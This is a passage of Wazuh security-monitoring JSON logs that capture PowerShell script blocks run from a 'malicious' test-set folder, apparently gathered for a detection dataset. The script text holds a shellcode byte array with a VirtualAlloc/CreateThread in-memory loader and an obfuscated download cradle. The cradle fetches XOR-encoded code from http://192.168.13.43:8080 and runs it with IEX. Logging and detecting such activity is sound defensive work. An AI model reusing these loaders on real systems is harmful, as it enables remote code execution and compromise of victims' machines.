xd2,0x37,0xfd,0x31,0x57,0x01,0x9f,0x44,0x68,0x58,0xcc,0x1b,0xc4,0x31,0xa5,0xf3,0xc7,0xb3,0x51,0x7f,0xe7,0x6e,0xe4,0xbf,0x62,0x9a,0xa8,0x4a,0x54,0xf2,0xc6,0x00,0xc4,0x54,0xd8,0xbe,0x63,0x18,0x4e,0x41,0x64,0x98,0x8e,0x29,0x84,0x98,0xce,0xa9,0xd7,0xf0,0x96,0x0d,0x84,0xe5,0xd8,0x9b,0xb8,0xb6,0x75,0xad,0x58,0x6f,0x12,0xad,0x86,0x8f,0xe2,0xfe,0x90,0xe7,0xf0,0x96,0x94,0x15,0x0b,0x43,0x23,0x19,0x80,0xa1,0xa7,0x9e,0x68,0xf9,0x3d,0x60,0x1f,0x18,0x65,0xa3,0xbf,0x0a,0xe3,0xdc,0xbf,0x34,0x62,0x4b,0x2e,0xac,0x0e,0xee,0xc3,0x5c,0x98,0x9e,0x7c,0xd4,0x3f,0x33,0xad,0x7e,0xaf,0xbb,0xc5,0x11,0x01,0x54,0x54,0x89,0x5d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$nGVk=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($nGVk.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$nGVk,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"d43d0789-ae97-4274-ad61-ee91905a5424","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\52.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:21:59.973+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":29,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304519.4207626","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:22:20.4134393Z","eventRecordID":"145900","processID":"8628","threadID":"7528","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$Wc=NeW-ObJEct SysTeM.NET.WEBCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERS.Add('User-Agent',$u);$wc.ProxY = [SysTEm.NeT.WEBREQuEst]::DEfauLTWEBPROxY;$wc.ProxY.CREdeNTIAls = [SyStEM.Net.CREDeNtiaLCAchE]::DEFaulTNEtWorkCREDentiALs;$K='21232f297a57a5a743894a0e4a801fc3';$I=0;[CHar[]]$b=([cHaR[]]($WC.DoWnLOadSTRINg(\"http://192.168.13.43:8080/index.asp\")))|%{$_-BXOR$k[$i++%$K.LenGth]};IEX ($b-JOiN'')\r\n\r\nScriptBlock ID: 606cae1f-8c2d-48bf-aa8c-7c28f3ad6931\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\530.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$Wc=NeW-ObJEct SysTeM.NET.WEBCLiEnT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HEAdERS.Add('User-Agent',$u);$wc.ProxY = [SysTEm.NeT.WEBREQuEst]::DEfauLTWEBPROxY;$wc.ProxY.CREdeNTIAls = [SyStEM.Net.CREDeNtiaLCAchE]::DEFaulTNEtWorkCREDentiALs;$K='21232f297a57a5a743894a0e4a801fc3';$I=0;[CHar[]]$b=([cHaR[]]($WC.DoWnLOadSTRINg(\\\"http://192.168.13.43:8080/index.asp\\\")))|%{$_-BXOR$k[$i++%$K.LenGth]};IEX ($b-JOiN'')","scriptBlockId":"606cae1f-8c2d-48bf-aa8c-7c28f3ad6931","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\530.ps1"}}},"location":"EventChannel"}
